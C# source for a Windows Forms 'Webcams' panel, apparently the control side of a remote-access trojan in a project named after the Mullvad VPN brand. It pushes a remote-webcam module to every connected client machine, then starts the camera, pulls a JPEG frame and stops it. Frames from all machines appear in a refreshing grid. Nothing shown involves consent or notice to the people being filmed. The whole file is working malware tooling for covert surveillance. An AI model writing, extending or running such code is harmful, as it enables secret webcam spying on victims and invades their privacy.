using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms
{
    internal sealed class WebcamsPanel : Form
    {
        private const string ModuleFile = "mullvad.Module.RemoteWebcam";
        private const string ModuleId   = "mullvad.remotewebcam";

        private readonly Dictionary<string, ClientHandler> _handlers;

        // ── Controls ──────────────────────────────────────────────────────────
        private ToolStrip         _toolbar     = null!;
        private ToolStripButton   _btnStart    = null!;
        private ToolStripButton   _btnStop     = null!;
        private ToolStripComboBox _cmbInterval = null!;
        private ToolStripComboBox _cmbQuality  = null!;
        private FlowLayoutPanel   _grid        = null!;

        // ── State ─────────────────────────────────────────────────────────────
        private bool          _running;
        private System.Windows.Forms.Timer _timer = null!;
        private readonly Dictionary<string, WebcamCell> _cells = new();
        private int           _quality => int.TryParse(_cmbQuality?.ComboBox?.SelectedItem?.ToString(), out int q) ? q : 20;

        public WebcamsPanel(Dictionary<string, ClientHandler> handlers)
        {
            _handlers = handlers;
            Build();
        }

        private void Build()
        {
            SuspendLayout();

            Text      = "Webcams";
            BackColor = ThemeManager.ControlColor;
            ForeColor = ThemeManager.ForeColor;

            // ── Toolbar ───────────────────────────────────────────────────────
            _toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden };

            _btnStart = new ToolStripButton("Start") { DisplayStyle = ToolStripItemDisplayStyle.Text };
            _btnStop  = new ToolStripButton("Stop")  { DisplayStyle = ToolStripItemDisplayStyle.Text, Enabled = false };

            _cmbInterval = new ToolStripComboBox { DropDownStyle = ComboBoxStyle.DropDownList, Width = 70 };
            _cmbInterval.Items.AddRange(new object[] { "1.5s", "3s", "5s", "10s", "20s", "60s" });
            _cmbInterval.SelectedIndex = 2; // 5s default

            _cmbQuality = new ToolStripComboBox { DropDownStyle = ComboBoxStyle.DropDownList, Width = 55 };
            _cmbQuality.Items.AddRange(new object[] { "10", "20", "30", "50", "70", "90" });
            _cmbQuality.SelectedIndex = 1; // 20 default

            _toolbar.Items.Add(_btnStart);
            _toolbar.Items.Add(_btnStop);
            _toolbar.Items.Add(new ToolStripSeparator());
            _toolbar.Items.Add(new ToolStripLabel("Interval:"));
            _toolbar.Items.Add(_cmbInterval);
            _toolbar.Items.Add(new ToolStripSeparator());
            _toolbar.Items.Add(new ToolStripLabel("Quality:"));
            _toolbar.Items.Add(_cmbQuality);

            // ── Grid ──────────────────────────────────────────────────────────
            _grid = new FlowLayoutPanel
            {
                Dock          = DockStyle.Fill,
                BackColor     = Color.Black,
                AutoScroll    = true,
                WrapContents  = true,
                FlowDirection = FlowDirection.LeftToRight,
                Padding       = new Padding(3),
            };

            Controls.Add(_grid);
            Controls.Add(_toolbar);

            _timer = new System.Windows.Forms.Timer { Interval = 5000 };
            _timer.Tick += Timer_Tick;

            _btnStart.Click += BtnStart_Click;
            _btnStop.Click  += BtnStop_Click;

            FormClosed += (_, _) => StopTimer();

            ResumeLayout(false);
        }

        private void BtnStart_Click(object? sender, EventArgs e)
        {
            if (_running) return;
            _running          = true;
            _btnStart.Enabled = false;
            _btnStop.Enabled  = true;
            RebuildGrid();
            UpdateTimerInterval();
            _timer.Start();
            RefreshAll();
        }

        private void BtnStop_Click(object? sender, EventArgs e) => Stop();

        private void Stop()
        {
            if (!_running) return;
            StopTimer();
        }

        private void StopTimer()
        {
            _running          = false;
            _timer.Stop();
            _btnStart.Enabled = true;
            _btnStop.Enabled  = false;
        }

        private void UpdateTimerInterval()
        {
            string sel = _cmbInterval.ComboBox?.SelectedItem?.ToString() ?? "5s";
            if (double.TryParse(sel.TrimEnd('s'), out double secs))
                _timer.Interval = Math.Max(500, (int)(secs * 1000));
        }

        private void Timer_Tick(object? sender, EventArgs e)
        {
            UpdateTimerInterval();
            RebuildGrid();
            RefreshAll();
        }

        private void RebuildGrid()
        {
            var ids = new HashSet<string>(_handlers.Keys);

            foreach (var id in new List<string>(_cells.Keys))
            {
                if (!ids.Contains(id))
                {
                    _grid.Controls.Remove(_cells[id]);
                    _cells[id].Dispose();
                    _cells.Remove(id);
                }
            }

            foreach (var id in ids)
            {
                if (!_cells.ContainsKey(id) && _handlers.TryGetValue(id, out var h))
                {
                    var cell = new WebcamCell(h.Info.Computer);
                    _cells[id] = cell;
                    _grid.Controls.Add(cell);
                }
            }
        }

        private void RefreshAll()
        {
            foreach (var kv in _cells)
            {
                if (_handlers.TryGetValue(kv.Key, out var h))
                    _ = FetchWebcamAsync(kv.Key, h, kv.Value);
            }
        }

        private async Task FetchWebcamAsync(string id, ClientHandler handler, WebcamCell cell)
        {
            // Don't stack requests for the same cell — the timer can tick faster
            // than a slow client answers, which floods the connection.
            if (cell.Busy) return;
            cell.Busy = true;

            try
            {
                var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
                if (bytes == null) return;

                using var deliverCts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(handler, ModuleFile, bytes, null, deliverCts.Token);
                if (!ok) return;

                using var ctx = new ModuleContext(handler, ModuleId);

                int q = _quality;
                using var startCts = new CancellationTokenSource(TimeSpan.FromSeconds(15));
                var startResp = await ctx.ExecuteAsync("start_stream", $"{{\"device\":0,\"width\":320,\"height\":240,\"fps\":1,\"quality\":{q}}}", startCts.Token);
                if (startResp?.Contains("\"ok\":true") != true) return; // camera dead / no device

                using var frameCts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                var frameResp = await ctx.ExecuteAsync("get_frame", "", frameCts.Token);

                using var stopCts = new CancellationTokenSource(TimeSpan.FromSeconds(3));
                await ctx.ExecuteAsync("stop_stream", "", stopCts.Token);

                if (frameResp?.Contains("\"ok\":true") != true) return;

                int di = frameResp.IndexOf("\"data\":\"");
                if (di < 0) return;
                int s = di + 8, e = frameResp.IndexOf('"', s);
                if (e <= s) return;

                byte[] packet = Convert.FromBase64String(frameResp.Substring(s, e - s));
                if (packet.Length < 13) return;
                byte[] jpeg = new byte[packet.Length - 13];
                Buffer.BlockCopy(packet, 13, jpeg, 0, jpeg.Length);

                Image frame = Image.FromStream(new MemoryStream(jpeg), false, false);
                if (!IsDisposed) cell.SetFrame(frame);
            }
            catch { }
            finally { cell.Busy = false; }
        }

        // ── Webcam cell ───────────────────────────────────────────────────────

        private sealed class WebcamCell : Panel
        {
            private readonly Label _lblName;
            private Image? _frame;
            private readonly Panel _img;
            public volatile bool Busy;

            public WebcamCell(string computerName)
            {
                Width     = 168;
                Height    = 116;
                Margin    = new Padding(3);
                BackColor = Color.FromArgb(30, 30, 30);

                _lblName = new Label
                {
                    Text      = computerName,
                    Dock      = DockStyle.Top,
                    Height    = 18,
                    TextAlign = ContentAlignment.MiddleCenter,
                    Font      = new Font("Segoe UI", 7.5F, FontStyle.Bold),
                    ForeColor = Color.White,
                    BackColor = Color.FromArgb(20, 20, 20),
                };

                _img = new DoublePanel { Dock = DockStyle.Fill, BackColor = Color.Black };
                _img.Paint += Img_Paint;

                Controls.Add(_img);
                Controls.Add(_lblName);
            }

            public void SetFrame(Image? frame)
            {
                if (_img.IsDisposed) return;
                Image? old = _frame;
                _frame = frame;
                old?.Dispose();
                if (!_img.IsDisposed)
                    _img.BeginInvoke((Action)(() => _img.Invalidate()));
            }

            private void Img_Paint(object? sender, PaintEventArgs e)
            {
                var f = _frame;
                if (f == null) return;
                var g    = e.Graphics;
                var size = _img.ClientSize;
                g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                g.DrawImage(f, 0, 0, size.Width, size.Height);
            }

            protected override void Dispose(bool disposing)
            {
                if (disposing) { _frame?.Dispose(); _frame = null; }
                base.Dispose(disposing);
            }

            private sealed class DoublePanel : Panel
            {
                public DoublePanel() { DoubleBuffered = true; }
            }
        }
    }
}
